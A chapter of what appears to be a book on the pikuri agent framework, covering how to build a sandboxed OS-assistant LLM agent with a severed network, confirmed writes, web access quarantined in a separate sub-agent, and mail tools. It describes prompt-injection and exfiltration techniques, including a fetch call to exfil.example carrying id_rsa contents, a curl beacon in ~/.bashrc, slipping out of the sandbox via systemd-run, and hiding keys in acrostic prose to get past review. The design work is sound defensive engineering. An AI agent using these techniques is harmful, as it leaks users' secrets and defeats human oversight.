# The OS assistant: your machine

`pikuri-os` is a single local agent whose job is to
understand and operate the computer you're sitting at: answer
questions about the system, find and read your files, explain what a
log is complaining about, advise on configuration. It is built from
the parts [the shell chapter](shell.md) introduced — `Workspace`
(what the LLM sees on the filesystem), `Confirmer` (how user-state
changes get approved), `Bash` (running a real shell), and `Sandbox`
(what that shell can actually touch) — cut the other way.

There is one thesis sentence to carry through this chapter.
[The security chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md) named the lethal trifecta —
private data, untrusted content, a way to send bytes out — and said
you defeat it by *structurally* removing a leg. pikuri's own agents
did that by leaving tools out. This one can't: it holds a shell, and
a shell can reach anything. So the kernel removes the leg instead,
and because reading your whole disk is the entire point, the leg it
removes is **egress**: the network is severed, so a prompt injection
in a log file has the data but nowhere to send it.
[The shell chapter](shell.md) made the *opposite* cut — it kept the
network (builds need it) and confined the disk instead. Same
adversary, opposite leg. Hold onto that; it's the through-line.

`pikuri-os` is a thin gem: it rides on top of `pikuri-workspace` (the
file tools) and `pikuri-code` (the shell and the sandbox), the same
two gems the shell chapter used. This chapter dwells only on what
it does differently.

The chapter runs in three parts. **Part 1** builds the agent as described
above — full disk, network severed. **Part 2** does the harder thing:
it puts the network *back*, carefully, without handing the trifecta its
third leg — and it's where [the sub-agents chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/subagents.md)'s sub-agents
earn their keep for privacy, not just parallelism. **Part 3** adds a
*second* app — your local mail and calendar — and uses it to sharpen the
trifecta itself: the difference between a leg being *present* and a leg
being *severe*.

---

## Part 1 — Your machine, no network

## Prerequisites

[The shell chapter](shell.md), and pikuri's
[security](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md) and
[sub-agents](https://codeberg.org/mvysny/pikuri/src/branch/master/book/subagents.md) chapters.
`llama-server` running, `bundle install` done. Plus a few OS-level
pieces, all of which **degrade rather than crash** except the first:

- **`bubblewrap`** (`bwrap`), as in the shell chapter — here it's
  what severs the network. This one is load-bearing, so `pikuri-os`
  probes it (and the unprivileged user/network namespaces it needs)
  at boot and **raises rather than silently running with an open
  network**.
- **A desktop file index**: GNOME's **`localsearch`** (the successor
  to Tracker, part of a GNOME desktop) or, on any desktop,
  **`recoll`** with an index you've built. When neither is usable,
  the `fileindex_*` tools are simply omitted and the agent still
  works with `bash` and the file tools.
- **`inxi`** — a hardware/desktop summariser, optional enrichment for
  the boot grounding. Absent is fine; the same facts come from
  `/proc`, `uname`, and the environment.

This agent points at your *real* home directory by design. It can't
reach the network, and every change stops for your confirmation — but
it is not a toy sandbox you can be careless in. Read the confirmations.

## Run it

```sh
pikuri-os/bin/pikuri-os "what's eating my disk in my home directory?"
```

or with no argument for an interactive REPL:

```sh
pikuri-os/bin/pikuri-os
> find the budget spreadsheet I was editing last week
> Any kernel errors or warnings in the log?
```

Before the prompt, the boot banner already states this chapter's
thesis:

```
Trifecta: pikuri-os — 2 of 3 legs (private, untrusted); no egress leg found.
```

Private data and untrusted content, both present, both maximal — and
no way out.

You'll watch it reach for read-only shell commands (`du`, `df`,
`journalctl`), the file-index tools, and `read` — and *not* stop you
for any of those. The only prompts you'll see are for changes:
writing a file, editing one, a `bash` command that isn't provably
read-only. That asymmetry is the whole design, and the next few
sections are why.

## The Sandbox seam — severing the network (the load-bearing move)

The naive way to build a no-internet agent is to "just not give it
internet tools." That doesn't hold: an unsandboxed `bash` reaches the
network freely with `curl`, `wget`, `nc`, or `apt`, and a sentence in
the system prompt saying "you have no internet" is a *request*, not a
property — a prompt injection in a file the agent reads can ignore it.

So the posture is precise: **a network sandbox with no filesystem
sandbox.** The `Sandbox` seam governs what the `bash` subprocess can
touch, independently of what the LLM sees through its file tools. The
coding agent ([the shell chapter](shell.md)) uses it to confine bash to a project
directory while keeping the network. The OS assistant wants the
*inverse*, and that's a sandbox variant of its own:

```ruby
sandbox = Pikuri::Code::Bash::Sandbox::FullFsNoNet.new(filesystem: filesystem)
```

`FullFsNoNet` binds `/` read-write — full host control, the whole
point of the agent — but **unshares the network namespace**, so the
shell has no route off the machine. The cut is made by the kernel,
not by the model's good behaviour. And because that property is
load-bearing, the variant *fails loud*: it probes `bwrap` and the
unprivileged namespaces it needs at construction and raises if they're
unavailable, rather than quietly degrading to an open network. The
only way to an internet-capable shell here is the explicit
`--no-sandbox` flag, which swaps in `Sandbox::NONE` and prints a
warning that the security property is off — the end of Part 1 says
where that flag belongs.

**This is where the security chapter's trifecta argument becomes concrete.** The
agent holds two legs — private data (your whole disk) and untrusted
content (logs, `~/Downloads`, cloned repos are all attacker-influenced
bytes) — but never the third. You can't ask it to give up disk access;
reading your machine *is* its job. So you cut the leg you can spare.
An injection that says "append a curl beacon to `~/.bashrc`" has no
network to beacon to, and the same severed leg also contains the more
mundane danger: the model's own honest mistake can't phone home
either. The shell chapter kept the network and cut disk-reach instead —
the opposite leg, forced by the opposite need.

**One subtlety, and it's the kind that bites anyone building this
themselves.** A network namespace binds *your process tree*. It says
nothing about what that tree can ask *someone else* to do — and on a
desktop, someone else is always listening. Your session bus is a
socket sitting in `/run/user/1000/`, and unix sockets don't care about
network namespaces, so binding `/` handed it to the sandbox intact.
That socket is a general-purpose "run this for me" service: a shell
inside the severed namespace can't fetch a URL, but `systemd-run
--user curl …` asks `systemd` to fetch it *outside* the namespace and
gets back a clean HTTP 200. Opening a file works the same way —
`xdg-open report.png` doesn't run the image viewer, it asks the bus to
run it, and the viewer starts as a child of `systemd`, with a network,
outliving the sandbox that asked for it.

So `FullFsNoNet` hides the session's sockets too: a fresh empty tmpfs
over `/run/user/<uid>` and `/tmp/.X11-unix`. That's what makes this
agent *headless* — it can diagnose your machine but it cannot open a
window, and that's a decision rather than a missing feature. Notice
the shape of the fix, because it generalizes well past this gem: the
answer was *not* a blocklist of `xdg-open`, `gio`, `gdbus`,
`systemd-run` — five lines of Python talk to that socket too, and you
would never finish the list. The answer was removing the *authority*.
Any time you catch yourself enumerating the names of bad commands, go
looking for the socket instead.

## The Workspace seam — the whole disk, one gate

`Workspace` is the *other* filesystem seam — not what the shell
touches, but what the LLM observes through `read` / `write` / `edit` /
`grep` / `glob`. For this agent the whole host is in scope, and — unlike
the coding agent of the shell chapter — the file tools are opened all the way up
to see exactly what `bash` sees:

```ruby
filesystem = Pikuri::Code::WholeDisk.new(project_root: Dir.pwd, denylist: [], private: true)
```

`WholeDisk` normally keeps a credential floor: the file tools refuse
`~/.ssh`, `~/.aws`, `/etc/shadow` and friends. This agent passes
`denylist: []` to drop it. That looks alarming until you notice `bash`,
running as you, could already `cat ~/.ssh/id_rsa` — and the passive-command
detector below even waves `cat` through with no prompt. A
read-block on the file tools that `bash` sidesteps for free isn't a
boundary; it's theatre, and it also blinds the agent to the very config
files it's here to help you fix. So the honest move is to make the tools
agree: they can all read your files. What actually stops a secret from
*leaving* is a different boundary — the severed network Part 1 built.
The rule of thumb: **reads are safe because egress is; what needs a
human is writes.**

`private: true` is the other half of that honesty. The coding agent
*asks* whether a project holds anything you'd mind leaking, because
a checkout might be a toy or a client's payroll. Here there's nothing
to ask: a workspace that reaches your home directory, your keys and
your browser profile is private by what it *is*. Declaring it makes
the trifecta report name `read` and `bash` among the tools holding
the private leg, which is what a reader of that report would go and
change.

`project_root` is just the anchor for relative paths ("what's in *this*
folder?") and where `bash` starts; absolute paths reach anywhere. There's
no containment fence — the opposite of the shell chapter's project-rooted
workspace, and deliberate: the job is the whole machine. The
read-before-edit gate from the shell chapter still stands.

## The Confirmer seam — writes stop for a human, with a diff

Reads are open; writes are where a human steps in. The coding agent
let new files and edits through without asking, because a project is
under version control and the cage kept them inside it. Neither holds
here, so the posture flips:

- **Every writable write confirms** — new files and `edit`s too, not
  just overwrites, each with an exact **diff** of what's about to
  change. Writes are rare for a diagnosis agent (it mostly reads), so
  confirming each one is cheap, and it matches the posture `bash`
  already has: every mutation stops for you. You approve a change you
  can *see*, line by line, rather than a blind write.
- **A write that can't succeed never prompts.** The file tools run as
  you, so a `write` to `/etc/fstab` fails with permission denied whether
  or not you approve — the confirmer detects that up front and returns
  "ask the user to do this with `sudo`" instead of a pointless prompt.
  This is also why there's no list of "sensitive paths" to maintain: the
  files worth confirming are simply *the ones you can actually write* —
  your own. `/etc`, `/boot`, another user's home are unwritable, so they
  never reach the prompt in the first place.

The confirmer neutralises hostile control characters before they reach
your terminal, as in the shell chapter, and that matters more here:
this agent reads untrusted files all day, and a diff line engineered
to look like a confirmation prompt gets defanged, not rendered.

You'll see this fire first not on a destructive command but on the
agent editing its own memory file, which is a section below.

## The passive-command detector, for a different reason

`bash` gets the same
[passive-command detector](shell.md#confirmation-fatigue-the-passive-command-detector)
as the coding agent, so `ls`, `du`, `journalctl` and their kind run
without a prompt. The same line passes in both agents —
`cat ~/.ssh/id_ed25519` — but for different reasons. In the coding
agent it was harmless because the cage hid the key. Here the agent can
read the key (it can read everything), and it's harmless because the
key has nowhere to go. The detector only ever grants reads; which
reads are safe is decided by the cut each agent made.

One knob differs: the detector is built with `allow_git: true`, so
read-only git (`status`, `diff`, `log`, `show`, `blame`) skips the
prompt with no per-repo trust question. `bash`'s
[git hardening](shell.md#even-git-status-runs-code) closes the
headline vector (`core.fsmonitor`) for every repo. The residual, a
diff driver named by a hostile `.gitattributes`, can still run a
program, but here it runs with no network to send what it reads.
That's the trade the coding agent couldn't make, because its network
is open. The program can still change your files, though, so a repo
you genuinely don't trust still belongs in a VM.

## Finding things — fileindex_search and fileindex_read

`find` and `grep` are fine for filenames and plain-text content, but
they're slow over the entire home directory and blind to PDFs and office
documents. Your desktop may already have solved this: GNOME ships
`localsearch`, a file indexer that has *already extracted the full
text* of your PDFs, spreadsheets, and documents, and it's entirely
local — inbound only, nothing to send out, a perfect fit for the
no-egress posture. On any other desktop, `recoll` does the same job
once you've built its index.

`pikuri-os` exposes the first of the two it finds usable as a
**search → read-full pair**, the same
two-step shape as `vectordb_search` → `vectordb_read` from
[the vector-DB chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/vectordb.md):

- **`fileindex_search`** finds files whose contents match your words —
  inside PDFs and office docs included — and returns each path with the
  one short snippet the index provides. It's honest about being a
  *locator*: the index reports at most one match per file, so the tool
  doesn't pretend to show the whole story.
- **`fileindex_read`** then returns a file's full extracted text,
  line-paged exactly like the `read` tool, with no extractor of its
  own (the index did the extraction at index time).

Each index has a blind spot, and the tool's description tells the
model which one it's working with. `localsearch` covers your home and
XDG folders but skips source trees and `.git` checkouts; `recoll`
covers exactly the folders you configured, source code included, and
nothing else. Neither indexes `/etc` or `/var`, so the agent reaches
for `grep` there. And it's best-effort: when no index is usable the
tools are simply not wired, and the agent falls back to `find`/`grep`.
This is "spotlight" as two tools the LLM reaches for, and we got it
from an index that already exists — which is also why a vector DB earns
no place in this agent: pointing one at `$HOME` would re-index the
exact corpus the desktop index already holds.

## MACHINE.md — durable notes about this machine

An assistant for your computer should remember where you keep your
work, how your files are synced, the quirks of *this* setup — and have
that knowledge in hand at the start of the next conversation.
[The next chapter](memories.md) builds one kind of durable memory,
mem0: automatic, invisible capture into a vector store. For this agent
the answer is deliberately simpler — a single markdown file:

```
~/.config/pikuri/MACHINE.md
```

A `AGENTS.md` for this host. It's read at boot and folded into the
system prompt, and the agent edits it through the *same confirmed
`write`/`edit` path* as any other file. That choice is the whole
point of contrast with mem0, whose safety will rest on an invisible
structural filter ("capture user-role content only"); `MACHINE.md`'s
safety is **visible, confirmed, and reversible** — a poisoned fact
can't land silently, because the write surfaces to you as a plain-text
diff ("agent wants to append: *backup server is `evil.example`*")
before it takes effect, and you can open and edit the file any time.
For one machine's small, bounded fact set, that beats a vector store
and a docker sidecar; it reuses machinery the agent already has and
needs no retrieval tier at all. (When the file doesn't exist yet, the
prompt still tells the agent where to create it.)

The residual to keep in view: a fact in `MACHINE.md` is in the
*system prompt* — instructions-adjacent, higher-privilege than a
mid-conversation recall — so a rubber-stamped poisoned edit has real
steering power. The counterweights are that it's your own trusted
file and every write is confirmed; the severed network still contains
the blast radius. There's a soft size guard, too: past ~10k the agent
is nudged to trim, the same way the Claude CLI nudges an oversized
`AGENTS.md`.

## Grounding — what the agent already knows about the host

A local model knows the FHS, man pages, `apt`, XDG, and bash well —
the prompt doesn't waste words re-teaching those. What it *can't* know
is *this* host, so the agent folds a small grounding block into the
system prompt at boot: distro and version, desktop environment, init
system, kernel, CPU/memory at a glance, the current date. Two of the
facts pre-empt a wrong guess the model otherwise makes routinely: the
**packaging** line names the host's manager (apt / dnf / pacman / …,
plus whether flatpak and snap are present), so it hands the user the
right install command instead of assuming apt; and the **dmesg** line
says up front whether reading the kernel ring buffer works as this user
or needs `sudo` (read from `kernel.dmesg_restrict`, not by spawning
`dmesg`), so it doesn't propose a command that returns "operation not
permitted". When `inxi` is present, `inxi -b` enriches the block; when
it isn't, the same facts come from `/etc/os-release`, `uname`,
`$XDG_CURRENT_DESKTOP`, `/proc`, and a `$PATH` probe. `inxi` is a
convenience, never a dependency — a missing one is silent, not fatal.
This is cheap and stops the model guessing distro paths.

## The wiring all together

One extension assembles the whole surface, the same `add_extension`
shape you've used since the sub-agents chapter:

```ruby
agent = Pikuri::Agent.new(
  transport: Pikuri::Agent::ChatTransport.from_openai_server(server:, model:, api_key:),
  system_prompt: system_prompt
) do |c|
  c.add_listener Pikuri::Agent::Listener::Terminal.new
  c.add_tool Pikuri::Tool::CALCULATOR
  c.add_extension Pikuri::Os::Extension.new(
    filesystem: filesystem,   # WholeDisk(project_root: Dir.pwd)
    confirmer:  confirmer,    # the *human* confirmer
    sandbox:    sandbox,      # FullFsNoNet
    plan_mode:  plan_mode     # the shared plan-mode flag, below
  )
end
```

`Os::Extension` is a composite: it adds `Workspace::Extension` (the
file tools) and `Code::Extension` (`bash`, with the
passive-command detector), then layers on the `fileindex_*` tools, the
grounding block, and the `MACHINE.md` section. The binary doesn't
re-derive any of that — and neither will the TUI or web client that
wire the same object later.

The one piece the host keeps a handle on is **plan mode**: a shared
`Code::PlanMode` flag, which guards the file tools' filesystem and drives
`Code::Extension`. Flipping it on (the REPL's `/plan`) makes `write`
and `edit` refuse — research and design without touching anything —
and `/impl` flips it back. It gates only `write` and `edit`; `bash`
is untouched, so a mutating command still stops at the confirmer
rather than being refused. The toggle is host-side: it's never sent
to the model.

## Lifting the cage, and where

Like the coding agent, `pikuri-os` has the off switches: `--no-sandbox`
drops the network cut, `--no-confirm` the gate, `--yolo` both. On your
host, `--no-sandbox` turns this agent into the one the security chapter
warned about: your whole disk, your untrusted logs, and now a way out.
So the rule is [the shell chapter's](shell.md#where-the-cage-stops):
**lifting the cage takes a VM**, and outside one the banner says so in
red.

Here that has a twist. Inside a VM, the OS assistant looks after the
VM, not your machine — so a VM can't be how you *use* it, only how you
*try* it. That's worth doing once: start a VM, run `pikuri-os --yolo`
in it, and give it the same tasks. No prompts, no severed network,
the model reaching for `curl` when it wants a man page. Then come back
to your host and notice what each prompt and each `No route to host`
was buying you.

---

## Part 2 — The third leg returns

The obvious next wish is "give it the internet." Part 1 cut egress to
make reading your dirty disk safe; the whole difficulty of Part 2 is that
a way out reassembles the full trifecta — private data (your disk),
untrusted content (logs, downloads), and now somewhere to send it. This
part restores the network *without* handing that third leg back. It's
opt-in and off by default: the agent stays exactly the Part 1 agent until
you pass `--with-internet`.

You might expect this to need elaborate taint-tracking — marking the
context "private" the moment it reads a file and severing egress from
then on. It doesn't: privilege separation plus a confirmed task turns
out to be enough, and that simpler shape is the story below.

## web_search vs fetch — who picks the destination

The two ways to reach the web are not equally dangerous, and the whole
design turns on the difference: **who chooses the destination host.**

- **`web_search`** — the model writes the *query*; **pikuri** picks the
  *destination* (one of a few baked-in engines: DuckDuckGo, Brave, Exa).
  An injection can smuggle a secret *into* the query string, but it can't
  point the request at its own server. Worst case, a search engine learns
  a laundered query — bad, but *bounded* and *attacker-blind*: a
  write-only dead-drop the adversary can't read back.
- **`web_scrape` / `fetch`** — the model supplies the *entire URL, host
  included*. `fetch("https://exfil.example/?d=<contents of id_rsa>")` is
  a one-call exfiltration; the recipient *is* the attack. Unbounded and
  attacker-controlled.

So egress isn't a single leg you either have or don't — it's a spectrum
from "bounded write-only" to "arbitrary exfil," set by who controls the
recipient. That distinction is the lever the rest of Part 2 pulls.

## Quarantine, don't grant

Given that, the design choice isn't *which* web tools the OS agent gets —
it's that the OS agent gets **none** of them. All three live one level
down, on a privilege-separated research sub-agent — the bundled
`RESEARCHER` persona from [the sub-agents chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/subagents.md) — reached through
the `agent` tool:

```ruby
c.add_sub_agent_tool Pikuri::Web::Search.from_h(examples_config['search'])
c.add_sub_agent_tool Pikuri::Web::SCRAPE
c.add_sub_agent_tool Pikuri::Web::FETCH
c.add_extension Pikuri::SubAgent::Extension.new(
  personas: [Pikuri::SubAgent::RESEARCHER],
  confirmer: confirmer
)
```

`add_sub_agent_tool` (not `add_tool`) is the load-bearing choice: those
tools are registered so *only a sub-agent* may see them — the parent LLM
never holds `fetch`, and so has **no direct egress at all**. And
`RESEARCHER` has the web tools but **no filesystem** — it can't read your
disk. Line the legs up against [the security chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md)'s trifecta:

- **The researcher** holds untrusted content + egress, but *not* private
  data — two legs, not three. Its `fetch` is unbounded, yes, but it has
  nothing private to send: the most it can leak is the task you handed it
  plus the public pages it fetched.
- **The parent** holds your disk (private) and reads untrusted files, but
  its only route out is *delegating* to the researcher. It never touches
  the web itself.

No single context holds all three legs. That's the structural break — the
same "remove a leg" move as Part 1, but made *per-agent* instead of
*per-machine*.

## The gate — what leaves the machine stops for you

Privilege separation alone raises the bar without quite breaking the
trifecta: the parent can still *ask* the researcher to look up "the drug
named `<secret>`," laundering a secret into the task string it writes. A
general researcher faithfully searches whatever subject it's handed — it
judges *how* to research a subject, never *whether* the subject is
legitimate.

So the task prompt — the one thing that crosses from the private side to
the networked side — stops for you:

```
Delegate this task to the 'researcher' sub-agent? It reaches the
network — you approve what leaves this machine.
  the current stable kernel version for Ubuntu 26.04
[y] approve  [e] edit  [n] reject  [r] redirect
```

This is the same `Confirmer` from Part 1, reused unchanged. The point is
subtle, and it's the lesson from `MACHINE.md`'s confirmed writes again:
you are **not** being asked to approve the agent's *judgement*. You can't
reliably spot a secret laundered into a plausible query (the security chapter's "no
NX flag for content") — *look up the definition of "hunter2waterfall"* is
a perfectly ordinary-looking request, and you'd have to already know the
password to catch it.

Which is why the two keys are two different jobs, and only one of them is
airtight. Press `y` and you're an **approver**: you read the model's
string and let it go. That stops the blatant attempt and nothing subtler,
for the reason just given. Press `e`, type your own query, and you're an
**author**: the only bytes that leave are ones you chose, so no encoding
survives the retype — an attacker can influence what the model
*proposes*, never what you *write*. The author seat is clean by
construction; the approver seat is a judgement call you've just been told
you can't reliably make.

So the honest claim for this gate is narrower than "you author what
leaves the machine," and still worth a lot: **nothing crosses unread, and
the means to make it something you wrote is one keystroke away.** Which of
the two you actually get is decided by which key you press. Part 3 puts
this under real pressure, once there's a second gate to compare it
against.

The reply comes back *without* a second confirmation, and that asymmetry
is deliberate. The untrusted-content leg was already accepted in Part 1
(the agent reads hostile logs off your disk all day), and the
researcher's answer arrives *summarised* — an injection buried in a
fetched page reaches the parent as a reported fact ("the page also said
to…"), not a live instruction. Confirm what goes *out*; let what comes
*in* be data, as it always was.

Note the third option. `e` gives you a `task>` line with the model's
task already on it, and sends **what you leave there** once you've
edited it, not what the model proposed — the difference between
approving a payload and authoring one. And if the task tripped a
`Sanitizer` warning, the prompt changes shape entirely:

```
⚠ retype required — [e] edit  [n] reject  [r] redirect
```

Bare approval is gone, and the `task>` line starts *empty*: a flagged task can
only proceed as bytes you wrote yourself. That is as close to a forced
author seat as a terminal gets — see "What the gate is — and isn't" at
the end of this chapter for why "as close as a terminal gets" is not the
same as "closed", and why the `y` on a *clean* task is where the residual
risk lives.

(`n` is a plain no: the agent is told to stop, not to find another way.
`r` lets you type what you want instead — "use the local docs, not the
web" — and that comes back to the agent as the observation, a decline
that steers instead of just ending. Richer confirmer shapes still on the list are in
[`design/ideas/more-confirmers.md`](https://codeberg.org/mvysny/pikuri/src/branch/master/design/ideas/more-confirmers.md).)

## Two network boundaries, not one

It's worth being exact about what `--with-internet` opens, because it is
*not* the boundary Part 1 built. There are two independent cuts:

1. **The bash sandbox** (`FullFsNoNet`) governs what the *shell
   subprocess* can reach. `--with-internet` does **not** touch it — bash
   stays kernel-severed whether or not the researcher is wired.
2. **Process-level HTTP** — the web tools make their requests from the
   pikuri process itself (over Faraday), entirely outside the shell
   sandbox.

You can watch both hold at once: with `--with-internet` on, ask the agent
to run `bash: curl https://example.com` and it still fails — no route,
the network namespace is unshared — while a research delegation succeeds.
Two boundaries, set independently; the flag moves only the second.

## Reading PDFs

A researcher that can't read the PDF it just found is half-blind, so
`pikuri-os` registers a PDF text extractor into the extraction registry
([the vector-DB chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/vectordb.md) met that registry):

```ruby
require 'pikuri-pdf'
Pikuri::Extractors::PDF.register
```

It's `pikuri-pdf`'s pure-Ruby reader — no subprocess, no docker, no
network, and it neither executes embedded JavaScript nor fetches remote
resources, so a hostile PDF can't turn *parsing* into egress and it stays
off the sandbox seam. That fit with the offline, audit-first posture is
why it wins here over the heavier sandboxed extractor (which would drag in
docker). It's registered **unconditionally**, not gated on
`--with-internet`: reading a local `~/Documents/*.pdf` is core
OS-assistant work too, and the extractor is inert until a PDF actually
shows up.

## The residual, honestly

Part 2 *weakens* the third leg; it does not delete it. What remains:

- **A bounded query leak.** The researcher can still be steered to put
  sensitive words into a search — to an engine that can't be read back by
  the attacker, but that does learn the query. This is the accepted floor
  of "usable web access at all," and it's the same leak your everyday
  browser already makes.
- **DoS, not RCE.** A crafted PDF could burn CPU/memory in the pure-Ruby
  parser; it can't execute code or phone home, and the run is interactive
  — Ctrl+C ends it.
- **Your attention on the gate.** The whole break rests on you *reading*
  the task you approve. A rubber-stamped delegation is the same failure as
  a rubber-stamped `MACHINE.md` edit — which is why the prompt shows you
  the exact task, why a *flagged* task won't let you bare-approve at all,
  and why Part 1's fewer-but-meaningful-prompts argument matters here too.
  A **clean** task still takes a one-key `y`, and that is the hole: the
  laundering this gate exists to stop is precisely the kind that arrives
  looking clean.

Sharper still — richer confirmers, an ingest-side gate on what the
researcher returns — is future work in
[`design/ideas/more-confirmers.md`](https://codeberg.org/mvysny/pikuri/src/branch/master/design/ideas/more-confirmers.md).

---

## Part 3 — A second app: local mail and calendar

Part 2 left you with a complete, trifecta-assembled agent whose third leg
is human-gated: `os --with-internet` reads your whole disk, reads
untrusted logs, and can reach the network — but only by handing a task
you approved to the quarantined researcher. That is the finished shape.
This part bolts a *second* app onto it — your local Thunderbird mail and
calendar — and the whole lesson is in one question: **what actually
changes when you do?**

The wiring is a demo binary, `bin/pikuri-computer`, that composes the
Part 2 agent with the `pikuri-thunderbird` surface:

```sh
./bin/pikuri-computer "reply to the landlord's email about the leak, and put the inspection on my calendar"
```

It *is* the Part 2 agent — `FullFsNoNet`, confirmed writes, plan mode, the
researcher on by default — plus one more extension's worth of mail and
calendar tools:

```ruby
c.add_extension Pikuri::Thunderbird::Extension.new(
  profile_dir: profile_dir, allow_compose_mail: true, allow_create_calendar_event: true
)
```

Six of those tools are read-only (search and read your mail, read an
attachment, resolve a contact, search and read your calendar) and touch nothing but
Thunderbird's own on-disk profile — no IMAP, no SMTP, no CalDAV. Two are
outbound and *opt-in on their own flag*: `allow_compose_mail` opens a
pre-filled compose window, `allow_create_calendar_event` stages an `.ics`
and opens Thunderbird's import wizard. Neither sends nor imports — each is
a hand-off to Thunderbird's own UI, where *you* click Send or pick the
calendar and confirm. (The mail/calendar usage guidance — the
untrusted-email policy, the "search before you assert" grounding
discipline, the draft-hand-off stance — isn't written into the binary's
prompt; it rides along *with the extension*, so wiring the surface in
can't forget to bring its own rules. That's why `pikuri-computer` appends
no mail fragment of its own.)

Now the question.

## Presence: nothing flips here

Line the new agent up against [the security chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md)'s trifecta and
all three legs are live — and *every one of them was already live in
Part 2*. The private pool (your disk) was there. The untrusted content
(logs, downloads) was there. The egress (the researcher's confirmed web
reach) was there. Adding mail and calendar changes none of that: the
trifecta was *already assembled* the moment Part 2 reattached the network.
So here, adding an outbound mail tool does **not** flip the agent from
safe to dangerous — there was no safe baseline to flip from.

To feel why that matters, run the thought experiment on the *other*
baseline. Take the **Part 1** agent — the default `pikuri-os`, no
researcher, egress severed by the kernel — and wire *only* thunderbird's
compose leg onto it. That agent had two legs and no way out; the compose
window is now the sole exit. Adding it flips the agent **broken →
assembled** in a single move. Same tool, opposite consequence — decided
entirely by whether an egress leg was already present.

That's the first half of the lesson, and it's *categorical*: **the
trifecta is binary in presence.** Either all three legs are live or they
aren't; a wiring is assembled or it isn't. The biggest move in the whole
model — two legs to three — has nothing to do with how much data is at
stake. It's a yes/no about leg *presence*.

## Severity: three things sharpen

If presence didn't move, why wire `pikuri-computer` carefully at all?
Because the *other* axis moved a lot. Three things get sharper when you
add mail to the disk-holding agent, and none of them is a new leg:

- **A stronger untrusted source.** Part 2's untrusted content was mostly
  logs and scraped pages — bytes the agent stumbled onto. An email is
  *addressed at you*, arrives looking legitimate, and can be written by
  anyone who knows your address. "Per our agreement, please send the
  signed lease to legal@…" reads like a task, not an attack. Mail is a
  better injection vector than a random page precisely because it's
  *aimed*.
- **A second egress channel — same mechanic, richer laundering surface.**
  The compose window is human-gated exactly like the researcher's task
  prompt: a model-authored draft you read and approve. But an email
  *body* is unconstrained prose, where a search *query* is short and
  query-shaped. A secret crossing in a single research task has nowhere
  to hide and surfaces as a blob you can see; the same secret in an email
  can hide inside fluent text — a fake reference number, a plausible
  sentence. The channel is no less gated; it's just a place where
  laundered exfil can look more innocent.
- **Pool amplification.** This is the one to hold onto. Take that *same,
  unchanged* compose leg and look at it in two homes. In standalone
  `bin/pikuri-thunderbird`, it sits next to a *mailbox* — the worst a
  poisoned draft carries out is your mail. In `bin/pikuri-computer`, the
  identical leg sits next to your *whole disk* — it's now a review-gated
  path for `~/.ssh/id_rsa`. Nothing about the tool changed. Its severity
  scaled with the size of the private pool beside it.

## The lesson, both axes in one line

> The trifecta is **binary in presence** — all three legs live means
> assembled, full stop — and **graded in severity** by the size of the
> private pool sitting beside the egress leg.

A leg that's low-risk in one wiring is serious in another, completely
unchanged. Presence tells you *whether* you have a problem; the pool
beside the egress tells you *how bad*. Part 1 → Part 2 was a presence move
(a leg returned). Part 2 → `pikuri-computer` is a severity move (the same
legs, a bigger pool, a richer channel). Reading a wiring means asking both
questions, never just one.

One refinement, which [Measuring the trifecta](https://codeberg.org/mvysny/pikuri/src/branch/master/book/trifecta-detector.md)
makes precise: **a leg's *presence* is binary, but its *strength* is
not.** The compose gate below is the case in point — it's a genuine
egress leg (assembled, no partial credit) that is nonetheless weaker
than an autonomous one, because you see the exact bytes before they
leave. So severity grades on two independent things: the size of the
private pool, *and* how strong each leg is. That's why
`pikuri-computer` reports **soft** rather than the loudest verdict —
assembled and warned, but not the same animal as an agent that can
send bytes nobody read.

## What the gate is — and isn't

It's tempting to rank the two egress gates as "the researcher makes you
the *author*, the compose window only makes you an *approver*." That's
wrong, and the correction is worth stating because the sloppy version
overstates the difference.

Both gates are the *same shape*: a model-authored prefill you read, then
approve, edit or discard. Part 2 made much of the `e` key, and it earns
that — but Thunderbird's compose window is an editable draft too. You can
retype the body before you Send it, exactly as you can retype a task
before you delegate it. Neither gate *makes* you an author; both offer the
seat and pre-fill their way out of it, because a blank window would be
useless ergonomics. Against a *blatant* exfil attempt — `base64` of your
private key dropped into either one — they're equally strong: you see the
foreign recipient and the obvious blob either way, and you refuse.

The real difference is the **laundering surface** — the severity point
above, sharpened. A research query is structurally short and query-shaped:
there's no room in it for fluent cover text, so a secret riding in a
*single* query surfaces as a blob you can see. An email body is free
prose, which offers a low-conspicuousness path the query can't. So the
compose gate is *marginally* weaker — and only against *laundered* exfil,
the case where the secret is disguised as ordinary text. That's a real but
narrow gap, not the wholesale "weaker gate" the author-vs-approver framing
implies.

## Why "too big to hide" is not a defense

Read that last paragraph carefully and a comfortable thought suggests
itself: *a password might slip through disguised as prose, but my SSH key
is 1.7 KB — far too much to smuggle past me one plausible sentence at a
time.* It's the most natural reassurance in this whole chapter, and it's
wrong. Worth taking apart, because the same mistake shows up wherever
people reason about gates.

It anchors on the **file** when what's being stolen is the **entropy**.
Almost all of a PEM is derived material an attacker regenerates from the
two primes stored inside it, so the floor — the bits that genuinely have to
cross — sits far below the file size. Take a first-letter acrostic, a
sentence whose words spell out the payload at roughly 4.7 bits per word. A
password is nine to seventeen words. A TOTP seed is about thirty-four. A
256-bit ed25519 private key — the whole key, not a hint of it — is about
fifty-five words. **One paragraph.**

But a floor is a floor, and reaching it takes arithmetic: packing a key
into an optimal acrostic is bit-level base conversion, exactly the work a
language model does badly and silently wrong. So price the channel by what
an agent can do *without* help — **transcribe**. Secrets live on disk as
text (base64 inside a PEM, hex, the base32 of a TOTP URI, BIP-39 words),
and copying characters one per word needs no computation at all. On that
reckoning an `id_ed25519` file is its ~400 base64 characters, so ~400
words; an RSA-2048 PEM is ~1600. Well above the floor — and still not a
wall. Note that modern keys got *smaller* as well as shorter-to-copy: the
ed25519 file is a quarter of the RSA one, which cuts against you either
way.

Which number applies is decided by the wiring, and the deciding factor is
worth holding on to: **a severed sandbox cuts the network, never the CPU.**
`bash` in this chapter's agent can't reach the internet, but `base64 -d`,
`xxd` and `openssl rsa -text` run inside it perfectly well. Give an agent
local compute and it reaches the floor — fifty-five words is the honest
number for `pikuri-computer`. Take the shell away, as the mail-only wiring
